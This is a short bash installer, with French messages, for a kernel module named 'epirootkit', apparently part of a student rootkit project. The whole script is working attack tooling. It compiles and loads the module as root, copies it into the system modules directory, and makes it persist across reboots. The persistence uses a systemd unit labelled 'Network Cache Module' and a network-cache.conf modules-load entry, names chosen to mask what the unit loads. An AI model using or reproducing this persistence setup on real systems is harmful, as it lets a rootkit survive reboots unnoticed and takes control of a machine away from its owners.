#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo "Ce script doit être exécuté en tant que root" >&2
    exit 1
fi

PROJECT_DIR=$(pwd)
MODULE_NAME="epirootkit"

make clean && make

if [ ! -f "${MODULE_NAME}.ko" ]; then
    echo "Erreur: La compilation a échoué" >&2
    exit 1
fi

if lsmod | grep -q "$MODULE_NAME"; then
    rmmod "$MODULE_NAME" 2>/dev/null
fi

insmod "${MODULE_NAME}.ko"

MODULE_DEST="/lib/modules/$(uname -r)/extra"
mkdir -p "$MODULE_DEST"
cp "${MODULE_NAME}.ko" "$MODULE_DEST/"
depmod -a

cat > /etc/systemd/system/network-cache.service << EOF
[Unit]
Description=Network Cache Module
After=network.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe $MODULE_NAME
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

systemctl enable network-cache.service

echo "$MODULE_NAME" > /etc/modules-load.d/network-cache.conf

echo "Installation et persistance configurées"
